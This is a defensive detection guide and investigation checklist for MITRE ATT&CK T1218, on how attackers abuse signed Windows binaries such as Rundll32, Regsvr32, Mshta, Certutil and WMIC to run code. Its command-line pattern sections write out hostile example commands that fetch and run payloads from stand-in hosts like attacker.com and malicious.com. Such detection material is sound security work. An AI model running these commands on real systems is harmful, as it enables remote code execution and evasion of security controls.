# System Binary Proxy Execution: [T1218](https://attack.mitre.org/techniques/T1218/)

## Detection Explanation

System Binary Proxy Execution involves adversaries abusing legitimate, signed system binaries to execute malicious code, scripts, or commands. This technique enables attackers to evade application whitelisting controls, bypass User Account Control (UAC), leverage trusted binaries to avoid detection, and hide malicious activity behind legitimate Windows processes. System binary proxy execution is commonly used throughout the attack lifecycle for initial access, execution, defense evasion, and persistence.

Attackers use system binary proxy execution because these binaries are digitally signed by Microsoft or other trusted vendors, inherently trusted by security controls, whitelisted by application control policies, and less likely to trigger alerts when executed. Common methods include abusing Rundll32 (T1218.011) to execute DLL functions, Regsvr32 (T1218.010) for COM scriptlet execution, Mshta (T1218.005) for HTML application execution, and other binaries like WMIC, Certutil, Regasm, Installutil, and Mavinject. These techniques are frequently combined with other evasion methods like obfuscation or remote file downloads.

Successful system binary proxy execution allows adversaries to execute arbitrary code with the appearance of legitimate system activity, bypass security controls designed to prevent unauthorized code execution, maintain persistence through trusted execution paths, and evade behavioral detection by hiding within expected process activity. The impact includes undetected malware execution, credential theft, lateral movement, command and control establishment, and data exfiltration—all while appearing as normal system operations.

Detection requires monitoring for unusual command-line parameters with system binaries, tracking execution from unexpected parent processes, identifying network connections from binaries that don't typically communicate externally, and correlating proxy execution with other suspicious activities. Organizations should baseline normal usage patterns for these binaries and alert on anomalies such as script execution via Mshta, DLL loading from unusual paths via Rundll32, or remote scriptlet execution via Regsvr32.

---

## Key Detection Indicators & Areas to Investigate

### Summary of Indicators

1. Rundll32 executing DLLs from unusual locations (T1218.011)
2. Regsvr32 executing remote scriptlets or non-standard scripts (T1218.010)
3. Mshta executing HTA files or JavaScript/VBScript (T1218.005)
4. WMIC executing commands or scripts (T1218.010)
5. Certutil downloading files or decoding malicious payloads
6. Regasm/Regsvcs executing non-.NET assemblies
7. Installutil executing malicious installers
8. MSBuild compiling and executing inline code
9. Mavinject injecting DLLs into processes
10. System binary execution with suspicious parent processes

---

### 1. Rundll32 Executing DLLs from Unusual Locations

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - Rundll32.exe execution
- Key fields: `CommandLine`, `ParentProcessName`

**Sysmon:**

- Event ID 1 (Process creation) - Rundll32.exe with detailed command line
- Event ID 7 (Image loaded) - DLLs loaded by Rundll32
- Event ID 3 (Network connection) - Network activity from Rundll32
- Key fields: `CommandLine`, `ParentImage`, `Image`

**PowerShell Logs:**

- Event ID 4104 (Script block logging) - PowerShell launching Rundll32

**Command-Line Patterns:**

- `rundll32.exe C:\Users\Public\malicious.dll,EntryPoint`
- `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('code')`
- `rundll32.exe url.dll,OpenURL http://malicious.com/payload.exe`
- `rundll32.exe advpack.dll,LaunchINFSection malicious.inf,DefaultInstall`
- `rundll32.exe shell32.dll,Control_RunDLL C:\malware.cpl`

**Focus on:**

- DLLs executed from non-system directories
- Network connections initiated by Rundll32
- JavaScript or VBScript protocol handlers
- Export functions with suspicious names
- Rundll32 spawned from Office applications or browsers

**Suspicious indicators:**

- Rundll32 executing DLLs from `%TEMP%`, `%APPDATA%`, `C:\Users\Public\`, `C:\ProgramData\`
- Command lines with JavaScript protocol: `rundll32.exe javascript:"..."`
- Rundll32 making outbound network connections (Sysmon Event ID 3)
- Parent process: `winword.exe`, `excel.exe`, `outlook.exe`, `chrome.exe` spawning Rundll32
- Export function names suggesting malicious activity: `DllRegisterServer`, `Main`, `EntryPoint`, random names
- `url.dll,OpenURL` or `url.dll,FileProtocolHandler` downloading executables
- `advpack.dll,LaunchINFSection` executing INF files from suspicious locations
- `shell32.dll,Control_RunDLL` executing .cpl files outside `C:\Windows\System32\`
- Rundll32 with no command-line arguments (DLL path missing - shellcode injection indicator)
- Multiple Rundll32 instances executing sequentially from same staging directory

---

### 2. Regsvr32 Executing Remote Scriptlets or Non-Standard Scripts

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - Regsvr32.exe execution
- Key fields: `CommandLine`, `ParentProcessName`

**Sysmon:**

- Event ID 1 (Process creation) - Regsvr32.exe command lines
- Event ID 3 (Network connection) - Regsvr32 network activity (squiblydoo technique)
- Event ID 7 (Image loaded) - DLLs/scripts loaded by Regsvr32
- Event ID 13 (Registry value set) - COM object registration

**Network Logs:**

- Proxy logs - Regsvr32 downloading remote scriptlets
- DNS logs - Regsvr32 resolving external domains
- Firewall logs - Outbound connections from Regsvr32

**Command-Line Patterns:**

- `regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll` (squiblydoo)
- `regsvr32.exe /s /i:http://attacker.com/evil.sct scrobj.dll`
- `regsvr32.exe /s C:\Users\Public\malicious.dll`
- `regsvr32.exe /u /n /s /i:http://site.com/script.sct scrobj.dll`

**Focus on:**

- Remote scriptlet execution (squiblydoo technique)
- Network connections from Regsvr32
- Script files (.sct) executed remotely
- Regsvr32 with unusual command-line switches
- Execution from non-administrative contexts

**Suspicious indicators:**

- Regsvr32 with `/i:http://` or `/i:https://` parameters (remote scriptlet download)
- Network connections from `regsvr32.exe` to external IPs (Sysmon Event ID 3)
- Command line containing `scrobj.dll` with `/i:` switch (squiblydoo technique)
- Regsvr32 executing from `%TEMP%`, `%APPDATA%`, or user directories
- `/s` (silent), `/n` (no DllRegisterServer), `/u` (unregister) switches in suspicious combinations
- Parent processes: Office applications, browsers, or script interpreters spawning Regsvr32
- `.sct` (scriptlet) files downloaded and executed from external URLs
- Regsvr32 executing during off-hours or from non-administrative user accounts
- Registry COM object registration (Event ID 13) from unexpected locations
- PowerShell or command scripts launching Regsvr32 with remote URLs

---

### 3. Mshta Executing HTA Files or JavaScript/VBScript

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - Mshta.exe execution
- Key fields: `CommandLine`, `ParentProcessName`

**Sysmon:**

- Event ID 1 (Process creation) - Mshta.exe command lines
- Event ID 3 (Network connection) - Mshta downloading remote HTA files
- Event ID 11 (File created) - HTA files downloaded by Mshta
- Event ID 10 (ProcessAccess) - Mshta accessing other processes (injection)

**Network Logs:**

- Proxy logs - Mshta downloading .hta files
- DNS logs - Domain resolution by Mshta
- Firewall logs - Outbound connections from Mshta

**Command-Line Patterns:**

- `mshta.exe http://malicious.com/payload.hta`
- `mshta.exe C:\Users\Public\malicious.hta`
- `mshta.exe javascript:close(new ActiveXObject("WScript.Shell").Run("cmd.exe"))`
- `mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run(""cmd"")")`
- `mshta.exe "about:<script>alert('code')</script>"`

**Focus on:**

- Remote HTA file execution
- Inline JavaScript or VBScript execution
- Network connections from Mshta
- Mshta spawning child processes (cmd.exe, powershell.exe)
- HTA files in unusual locations

**Suspicious indicators:**

- Mshta executing URLs: `mshta.exe http://` or `mshta.exe https://`
- Inline script execution: `mshta.exe javascript:` or `mshta.exe vbscript:`
- Mshta making network connections to external IPs (Sysmon Event ID 3)
- HTA files executed from `%TEMP%`, `%APPDATA%`, `C:\Users\Public\`, email attachments
- Mshta spawning `cmd.exe`, `powershell.exe`, `wscript.exe`, or other interpreters
- Parent processes: Email clients, browsers, Office applications launching Mshta
- Command lines with encoded or obfuscated scripts
- Mshta accessing other process memory (Sysmon Event ID 10) - process injection
- `.hta` file downloads followed immediately by Mshta execution
- Mshta execution during phishing or initial access timeframes

---

### 4. WMIC Executing Commands or Scripts

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - Wmic.exe execution
- Key fields: `CommandLine`, `ParentProcessName`

**Sysmon:**

- Event ID 1 (Process creation) - WMIC command lines
- Event ID 3 (Network connection) - WMIC network activity
- Event ID 11 (File created) - Files created by WMIC execution

**Command-Line Patterns:**

- `wmic process call create "cmd.exe /c malicious.exe"`
- `wmic /node:target process call create "powershell.exe -enc <base64>"`
- `wmic os get /format:"http://malicious.com/evil.xsl"`
- `wmic process get brief /format:list`
- `wmic /node:@targets.txt process call create "cmd.exe"`

**XSL Script Abuse:**

- `/format` parameter loading remote XSL stylesheets
- XSL containing embedded scripts (JScript, VBScript)
- Local XSL files with malicious code

**Focus on:**

- WMIC creating processes locally or remotely
- XSL script execution via /format parameter
- Remote execution via /node parameter
- Network connections from WMIC
- WMIC spawned from suspicious parent processes

**Suspicious indicators:**

- `wmic process call create` executing commands or malware
- WMIC with `/node:` parameter targeting remote systems (lateral movement)
- `/format:` parameter loading remote XSL: `wmic os get /format:"http://attacker.com/payload.xsl"`
- WMIC making outbound network connections (Sysmon Event ID 3)
- XSL files containing embedded scripts in `msxsl:script` tags
- WMIC creating processes: `cmd.exe`, `powershell.exe`, executables from `%TEMP%`
- Parent processes: Office applications, browsers, or compromised services spawning WMIC
- WMIC with base64-encoded PowerShell commands
- Remote execution to multiple systems: `wmic /node:@computerlist.txt`
- WMIC execution during reconnaissance or lateral movement phases

---

### 5. Certutil Downloading Files or Decoding Malicious Payloads

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - Certutil.exe execution
- Key fields: `CommandLine`, `ParentProcessName`

**Sysmon:**

- Event ID 1 (Process creation) - Certutil command lines
- Event ID 3 (Network connection) - Certutil network activity
- Event ID 11 (File created) - Files downloaded or decoded by Certutil

**Network Logs:**

- Proxy logs - Certutil downloading files
- DNS logs - Domain resolution by Certutil
- Firewall logs - Outbound HTTP/HTTPS from Certutil

**Command-Line Patterns:**

- `certutil.exe -urlcache -split -f http://malicious.com/payload.exe C:\temp\malware.exe`
- `certutil.exe -decode encoded.txt decoded.exe`
- `certutil.exe -decodehex hexfile.txt binary.exe`
- `certutil.exe -verifyctl -split -f http://attacker.com/payload`

**Legitimate vs. Malicious Usage:**

- Legitimate: Certificate management, CRL verification
- Malicious: File downloads, base64/hex decoding, payload staging

**Focus on:**

- Certutil downloading files from external URLs
- Base64 or hex decoding operations
- File downloads to suspicious locations
- Network connections from Certutil
- Certutil used for non-certificate operations

**Suspicious indicators:**

- Certutil with `-urlcache` and `-f` downloading executables: `.exe`, `.dll`, `.ps1`
- Downloads to suspicious directories: `%TEMP%`, `%APPDATA%`, `C:\Users\Public\`
- `-decode` or `-decodehex` operations creating executable files
- Network connections from `certutil.exe` to external IPs (Sysmon Event ID 3)
- Certutil downloading from IP addresses instead of domain names
- Command lines with multiple operations: download, decode, split
- Parent processes: Office apps, browsers, script interpreters launching Certutil
- Certutil executed immediately after phishing email or document opening
- Downloaded files executed shortly after Certutil completion
- Certutil used in conjunction with other living-off-the-land binaries (LOLBins)

---

### 6. Regasm/Regsvcs Executing Non-.NET Assemblies

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - Regasm.exe or Regsvcs.exe execution
- Key fields: `CommandLine`, `ParentProcessName`

**Sysmon:**

- Event ID 1 (Process creation) - Regasm/Regsvcs command lines
- Event ID 7 (Image loaded) - Assemblies loaded
- Event ID 3 (Network connection) - Network activity from Regasm/Regsvcs
- Event ID 10 (ProcessAccess) - Process injection attempts

**Command-Line Patterns:**

- `regasm.exe /U C:\malicious\assembly.dll`
- `regsvcs.exe C:\Users\Public\malware.dll`
- `regasm.exe C:\Temp\payload.dll /codebase`

**Focus on:**

- Regasm/Regsvcs executing from non-development systems
- Assemblies loaded from unusual locations
- Network connections from these binaries
- Execution by non-developer accounts
- DLLs from temporary or user-writable directories

**Suspicious indicators:**

- Regasm/Regsvcs executing assemblies from `%TEMP%`, `%APPDATA%`, `C:\Users\Public\`
- Network connections from `regasm.exe` or `regsvcs.exe` (Sysmon Event ID 3)
- Execution on systems without development tools installed
- User accounts executing Regasm/Regsvcs that aren't developers
- DLL files recently downloaded or created then immediately registered
- Command lines with `/U` (unregister) used to execute malicious code
- Parent processes: Office applications, browsers, or script interpreters
- Regasm/Regsvcs spawning child processes: `cmd.exe`, `powershell.exe`
- Process injection (Sysmon Event ID 10) from Regasm/Regsvcs
- Assemblies without .NET metadata or suspicious entry points

---

### 7. Installutil Executing Malicious Installers

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - InstallUtil.exe execution
- Key fields: `CommandLine`, `ParentProcessName`

**Sysmon:**

- Event ID 1 (Process creation) - InstallUtil command lines
- Event ID 7 (Image loaded) - Assemblies loaded by InstallUtil
- Event ID 3 (Network connection) - Network activity from InstallUtil
- Event ID 10 (ProcessAccess) - Process access by InstallUtil

**Command-Line Patterns:**

- `installutil.exe /logfile= /LogToConsole=false /U C:\malicious.dll`
- `installutil.exe C:\Users\Public\malware.exe`
- `installutil.exe /installtype=notransaction /action=install C:\payload.dll`

**Focus on:**

- InstallUtil on non-development systems
- Installers from unusual locations
- Network connections from InstallUtil
- Bypassing logging with /logfile parameter
- Execution by non-administrative or non-developer accounts

**Suspicious indicators:**

- InstallUtil executing assemblies from `%TEMP%`, `%APPDATA%`, `C:\Users\Public\`
- `/logfile=` parameter set to empty or null (hiding execution logs)
- `/LogToConsole=false` suppressing output
- Network connections from `installutil.exe` (Sysmon Event ID 3)
- Execution on servers or workstations without Visual Studio or .NET SDK
- InstallUtil spawning child processes: `cmd.exe`, `powershell.exe`
- `/U` (uninstall) parameter used to trigger malicious code
- Parent processes: Office apps, browsers, or scripts launching InstallUtil
- Recently downloaded or created assemblies immediately executed
- InstallUtil accessing other process memory (process injection)

---

### 8. MSBuild Compiling and Executing Inline Code

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - MSBuild.exe execution
- Key fields: `CommandLine`, `ParentProcessName`

**Sysmon:**

- Event ID 1 (Process creation) - MSBuild command lines
- Event ID 11 (File created) - Project files or compiled outputs
- Event ID 3 (Network connection) - Network activity from MSBuild
- Event ID 7 (Image loaded) - Assemblies loaded during compilation

**Command-Line Patterns:**

- `msbuild.exe C:\malicious\project.csproj`
- `msbuild.exe C:\Users\Public\payload.xml`
- `msbuild.exe /target:ClassLibrary C:\inline_code.proj`

**Inline Code Techniques:**

- XML project files with embedded C# or VB.NET code
- `<UsingTask>` elements with inline tasks
- Code execution through build process

**Focus on:**

- MSBuild on non-development systems
- Project files from unusual locations
- XML files executed as build projects
- Network connections from MSBuild
- Execution by non-developer accounts

**Suspicious indicators:**

- MSBuild executing `.csproj` or `.xml` files from `%TEMP%`, `%APPDATA%`, `C:\Users\Public\`
- XML project files containing inline `<Code>` sections with C# or VB.NET
- MSBuild on systems without Visual Studio or .NET development tools
- Network connections from `msbuild.exe` (Sysmon Event ID 3)
- Project files downloaded from external sources then immediately built
- MSBuild spawning child processes: `cmd.exe`, `powershell.exe`, malware
- Parent processes: Office apps, browsers, or scripts launching MSBuild
- `<UsingTask>` elements with suspicious inline task implementations
- Build files with obfuscated or encoded code sections
- MSBuild execution during off-hours or by non-developer accounts

---

### 9. Mavinject Injecting DLLs into Processes

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - Mavinject.exe execution
- Key fields: `CommandLine`, `ParentProcessName`

**Sysmon:**

- Event ID 1 (Process creation) - Mavinject command lines
- Event ID 8 (CreateRemoteThread) - Thread creation for injection
- Event ID 10 (ProcessAccess) - Process access by Mavinject
- Event ID 7 (Image loaded) - DLLs loaded via injection

**Command-Line Patterns:**

- `mavinject.exe <PID> /INJECTRUNNING C:\malicious.dll`
- `mavinject.exe 1234 /INJECTRUNNING C:\Users\Public\payload.dll`
- `mavinject32.exe <PID> /INJECTRUNNING <DLL_Path>`

**Focus on:**

- Mavinject injecting DLLs from unusual locations
- Injection into sensitive processes
- Network connections after DLL injection
- Mavinject executed by non-standard users
- DLLs without valid signatures

**Suspicious indicators:**

- Mavinject injecting DLLs from `%TEMP%`, `%APPDATA%`, `C:\Users\Public\`, `C:\ProgramData\`
- Target processes: `explorer.exe`, `svchost.exe`, browser processes, security tools
- DLLs without digital signatures or signed by untrusted entities
- Sysmon Event ID 8 (CreateRemoteThread) from Mavinject to target process
- Network connections from previously benign processes after injection
- Mavinject executed by non-administrative or system accounts
- Parent processes: Office apps, browsers, or malicious processes launching Mavinject
- Injection immediately following malware execution or compromise
- Multiple injection attempts targeting different processes
- DLL paths with suspicious names or recently created timestamps

---

### 10. System Binary Execution with Suspicious Parent Processes

**Sysmon:**

- Event ID 1 (Process creation) - System binaries with unusual parents
- Key fields: `Image`, `ParentImage`, `CommandLine`

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - Process relationships
- Key fields: `NewProcessName`, `ParentProcessName`

**Suspicious Parent-Child Relationships:**

- Office applications spawning system binaries
- Browsers spawning execution proxies
- Email clients launching system utilities
- Script interpreters spawning multiple proxies

**Focus on:**

- System binaries launched from Office applications
- Rundll32, Regsvr32, Mshta from browsers
- Multiple system binaries in execution chain
- System binaries from email client processes
- Unusual process trees indicating compromise

**Suspicious indicators:**

- `winword.exe`, `excel.exe`, `outlook.exe` spawning `rundll32.exe`, `mshta.exe`, `regsvr32.exe`
- `chrome.exe`, `firefox.exe`, `iexplore.exe` as parent of system proxy execution binaries
- PowerShell spawning Certutil, WMIC, or other LOLBins in rapid succession
- Email clients (`outlook.exe`, `thunderbird.exe`) spawning `mshta.exe` or `rundll32.exe`
- Execution chains: `winword.exe` → `powershell.exe` → `certutil.exe` → `rundll32.exe`
- Scripting hosts (`wscript.exe`, `cscript.exe`) spawning system binaries
- PDF readers (`AcroRd32.exe`) spawning `mshta.exe` or `regsvr32.exe`
- Web server processes (`w3wp.exe`, `apache.exe`) spawning system proxy binaries
- Multiple system binaries executed in sequence from same parent process
- System binaries spawned during document opening or email attachment processing
---
# System Binary Proxy Execution Investigation Checklist

## 1. Rundll32 Suspicious Execution

- [ ] Check Rundll32 executing DLLs from %TEMP%, %APPDATA%, C:\Users\Public, C:\ProgramData\
- [ ] Review command lines with JavaScript protocol: rundll32.exe javascript:"..."
- [ ] Monitor Rundll32 making outbound network connections (Sysmon Event ID 3)
- [ ] Identify parent processes: winword.exe, excel.exe, chrome.exe spawning Rundll32
- [ ] Look for export functions: DllRegisterServer, Main, EntryPoint, random names
- [ ] Check url.dll,OpenURL or url.dll,FileProtocolHandler downloading executables
- [ ] Review advpack.dll,LaunchINFSection executing INF files from suspicious locations
- [ ] Monitor Rundll32 with no command-line arguments (DLL path missing)

## 2. Regsvr32 Remote Scriptlet Execution

- [ ] Check Regsvr32 with /i:http:// or /i:https:// parameters (squiblydoo)
- [ ] Review network connections from regsvr32.exe to external IPs
- [ ] Monitor command lines with scrobj.dll and /i: switch
- [ ] Identify Regsvr32 executing from %TEMP%, %APPDATA%, user directories
- [ ] Look for /s (silent), /n (no DllRegisterServer), /u combinations
- [ ] Check parent processes: Office apps, browsers, scripts spawning Regsvr32
- [ ] Review .sct (scriptlet) files downloaded from external URLs
- [ ] Monitor Regsvr32 during off-hours or from non-administrative accounts

## 3. Mshta HTA/Script Execution

- [ ] Check Mshta executing URLs: mshta.exe http:// or https://
- [ ] Review inline scripts: mshta.exe javascript: or mshta.exe vbscript:
- [ ] Monitor Mshta making network connections to external IPs
- [ ] Identify HTA files from %TEMP%, %APPDATA%, C:\Users\Public, email attachments
- [ ] Look for Mshta spawning cmd.exe, powershell.exe, wscript.exe
- [ ] Check parent processes: Email clients, browsers, Office apps launching Mshta
- [ ] Review Mshta accessing other process memory (process injection)
- [ ] Monitor .hta downloads followed immediately by Mshta execution

## 4. WMIC Command Execution

- [ ] Check wmic process call create executing commands or malware
- [ ] Review WMIC with /node: parameter targeting remote systems
- [ ] Monitor /format: loading remote XSL: wmic os get /format:"http://..."
- [ ] Identify WMIC making outbound network connections
- [ ] Look for XSL files with embedded scripts in msxsl:script tags
- [ ] Check WMIC creating: cmd.exe, powershell.exe, executables from %TEMP%
- [ ] Review parent processes: Office apps, browsers, compromised services spawning WMIC
- [ ] Monitor remote execution: wmic /node:@computerlist.txt

## 5. Certutil File Download/Decode

- [ ] Check Certutil with -urlcache and -f downloading .exe, .dll, .ps1
- [ ] Review downloads to %TEMP%, %APPDATA%, C:\Users\Public\
- [ ] Monitor -decode or -decodehex creating executable files
- [ ] Identify network connections from certutil.exe to external IPs
- [ ] Look for Certutil downloading from IP addresses vs. domains
- [ ] Check parent processes: Office apps, browsers, scripts launching Certutil
- [ ] Review Certutil executed after phishing email or document opening
- [ ] Monitor downloaded files executed shortly after Certutil completion

## 6. Regasm/Regsvcs Assembly Execution

- [ ] Check Regasm/Regsvcs executing assemblies from %TEMP%, %APPDATA%, C:\Users\Public\
- [ ] Review network connections from regasm.exe or regsvcs.exe
- [ ] Monitor execution on systems without development tools
- [ ] Identify user accounts executing that aren't developers
- [ ] Look for recently downloaded/created DLLs immediately registered
- [ ] Check /U (unregister) used to execute malicious code
- [ ] Review parent processes: Office apps, browsers, scripts
- [ ] Monitor Regasm/Regsvcs spawning cmd.exe, powershell.exe

## 7. Installutil Malicious Installer Execution

- [ ] Check InstallUtil executing assemblies from %TEMP%, %APPDATA%, C:\Users\Public\
- [ ] Review /logfile= set to empty or null (hiding logs)
- [ ] Monitor /LogToConsole=false suppressing output
- [ ] Identify network connections from installutil.exe
- [ ] Look for execution on servers without Visual Studio or .NET SDK
- [ ] Check InstallUtil spawning cmd.exe, powershell.exe
- [ ] Review /U (uninstall) parameter triggering malicious code
- [ ] Monitor parent processes: Office apps, browsers, scripts

## 8. MSBuild Inline Code Execution

- [ ] Check MSBuild executing .csproj or .xml from %TEMP%, %APPDATA%, C:\Users\Public\
- [ ] Review XML project files with inline Code> sections (C# or VB.NET)
- [ ] Monitor MSBuild on systems without Visual Studio or .NET development tools
- [ ] Identify network connections from msbuild.exe
- [ ] Look for project files downloaded then immediately built
- [ ] Check MSBuild spawning cmd.exe, powershell.exe, malware
- [ ] Review UsingTask> elements with suspicious inline tasks
- [ ] Monitor MSBuild during off-hours or by non-developer accounts

## 9. Mavinject DLL Injection

- [ ] Check Mavinject injecting DLLs from %TEMP%, %APPDATA%, C:\Users\Public\
- [ ] Review target processes: explorer.exe, svchost.exe, browsers, security tools
- [ ] Monitor DLLs without digital signatures or untrusted signatures
- [ ] Identify Sysmon Event ID 8 (CreateRemoteThread) from Mavinject
- [ ] Look for network connections from processes after injection
- [ ] Check Mavinject by non-administrative or system accounts
- [ ] Review parent processes: Office apps, browsers, malicious processes
- [ ] Monitor injection immediately following malware execution

## 10. Suspicious Parent-Child Relationships

- [ ] Check winword.exe, excel.exe, outlook.exe spawning rundll32.exe, mshta.exe, regsvr32.exe
- [ ] Review chrome.exe, firefox.exe, iexplore.exe as parent of system binaries
- [ ] Monitor execution chains: winword.exe → powershell.exe → certutil.exe → rundll32.exe
- [ ] Identify scripting hosts (wscript.exe, cscript.exe) spawning system binaries
- [ ] Look for PDF readers spawning mshta.exe or regsvr32.exe
- [ ] Check web server processes (w3wp.exe) spawning system proxy binaries
- [ ] Review email clients spawning mshta.exe or rundll32.exe
- [ ] Monitor multiple system binaries in sequence from same parent